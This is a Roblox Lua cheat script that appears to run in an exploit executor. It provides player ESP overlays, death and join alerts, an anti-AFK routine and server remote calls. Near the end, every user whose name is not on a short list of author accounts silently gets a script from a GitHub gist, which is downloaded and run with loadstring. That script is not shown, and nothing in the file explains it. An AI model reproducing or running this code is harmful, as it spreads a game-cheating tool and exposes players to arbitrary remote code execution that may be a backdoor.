InterfaceManager:SetLibrary(Fluent)
InterfaceManager:BuildInterfaceSection(Tabs.Settings)

if not getgenv().first then
	getgenv().first = true
	function PlayerJoined(text)
		game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
			Text = text,
			Color = Color3.fromRGB(0, 255, 26),
			Font = Enum.Font.SourceSansBold,
			TextSize = 20
		})
	end

	function PlayerLeft(text)
		game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
			Text = text,
			Color = Color3.fromRGB(255, 0, 0),
			Font = Enum.Font.SourceSansBold,
			TextSize = 20
		})
	end

	for i, v in pairs(game.Players:GetPlayers()) do
        if workspace:FindFirstChild(v.Name) then
            workspace:FindFirstChild(v.Name):WaitForChild("Humanoid").Died:Connect(function()
				game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", ({Text =  v.DisplayName .. " (@" .. v.Name .. ") Dead",Color = Color3.fromRGB(255, 0, 0),Font = Enum.Font.SourceSansBold,TextSize = 20}))
			end)
        end
		v.CharacterAdded:Connect(function(character)
			character:WaitForChild("Humanoid").Died:Connect(function()
				game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", ({Text =  v.DisplayName .. " (@" .. v.Name .. ") Dead",Color = Color3.fromRGB(255, 0, 0),Font = Enum.Font.SourceSansBold,TextSize = 20}))
			end)
		end)
	end
	
	game.Players.PlayerAdded:Connect(function(player)
		player.CharacterAdded:Connect(function(character)
			character:WaitForChild("Humanoid").Died:Connect(function()
				game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", ({Text = player.DisplayName .. " (@" .. player.Name .. ") Dead",Color = Color3.fromRGB(255, 0, 0),Font = Enum.Font.SourceSansBold,TextSize = 20}))
			end)
		end)
	end)
	
	for i,v in pairs(game.Players:GetChildren()) do
		coroutine.wrap(function()
			if v ~= game.Players.LocalPlayer then
				v.leaderstats.Status.Changed:Connect(function()
					pcall(function()
						workspace.ESPFolder[character.Name].Frame.Names.TextColor3 = updateColor(v.leaderstats.Status.Value)
					end)
				end)
				v.CharacterAdded:Connect(function(char)
					spawn(function()
						if Fluent.Options.U5.Value then
							CreateESP(char)
						end
					end)
				end)
			end
		end)()
	end
	game.Players.PlayerAdded:Connect(function(player)
		PlayerJoined(player.DisplayName .. " (@" .. player.Name .. ") Has joined")
		player.CharacterAdded:Connect(function(char)
			spawn(function()
				if Fluent.Options.U5.Value then
					CreateESP(char)
				end
			end)
		end)
		repeat task.wait() until player:FindFirstChild("leaderstats") and player:FindFirstChild("leaderstats"):FindFirstChild("Status")
		player.leaderstats.Status.Changed:Connect(function()
			pcall(function()
				if workspace.ESPFolder:FindFirstChild(player.Name) then
					workspace.ESPFolder[player.Name].Frame.Names.TextColor3 = updateColor(player.leaderstats.Status.Value)
				end
			end)
		end)
	end)

	game.Players.PlayerRemoving:Connect(function(player)
		PlayerLeft(player.DisplayName .. " (@" .. player.Name .. ") Has left")
		for i,v in next, workspace.ESPFolder:GetChildren() do
			if v.Name == player.Name then
				v:Destroy()
			end
		end
		if table.find(targets, player.Name) then
			for i, v in next, targets do
				if targets[i] == player.Name then
					table.remove(targets, i)
				end
			end
		end
	end)

	function is_aura_enabled()
		local result = false
		for i,v in next, game.Players.LocalPlayer.Character:GetDescendants() do
			if v.Name == "Aura1" or v.Name == "Aura2" then
				result = true
				break
			end
		end
		return result
	end
	
	game.Players.LocalPlayer.CharacterAdded:Connect(function()
		if getgenv().superaura == true then
			task.wait(0.5)
			game.ReplicatedStorage.RemoteEvent:FireServer({"ConcealRevealAura", "Start" })
		elseif getgenv().offaura == true then
			repeat task.wait() until is_aura_enabled() == true
			game.ReplicatedStorage.RemoteEvent:FireServer({"ConcealRevealAura", "Start" })
		end
	end)
end

workspace.Storage.ChildAdded:Connect(function(child)
	task.wait(0)
	if Fluent.Options.U1.Value then
		child.Color = Color3.fromHSV(0,0,0)
		child.Transparency = 0
	end
	if Fluent.Options.U2.Value then  
		while task.wait(0) do
			child.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
			child.Transparency = 0
		end
	end
end)

workspace.FallenPartsDestroyHeight = math.huge-math.huge

game:GetService("Players").LocalPlayer.Idled:connect(function()
    game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    task.wait(1)
    game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end) 

local nicks = {"vNCC1337","Wer4er_official","GaladonT","Wer4erAlt","Lurrnan"}
local player = game.Players.LocalPlayer
if table.find(nicks,player.Name) then
    Fluent:Notify({
		Title = "GaySex",
		Content = "Welcome to the club, sexy buddy",
		SubContent = "",
		Duration = 5
	})
else
	loadstring(game:HttpGet('https://gist.githubusercontent.com/Wer4er/31a1c2ae8d956d83d18c574cf0b3f602/raw/373ae835f500580fba593939f801e4577673380c/gistfile1.txt'))()
    Fluent:Notify({
		Title = "Z3XHub",
		Content = 'Welcome ' .. player.Name .. '!',
		SubContent = "",
		Duration = 5
	})
end
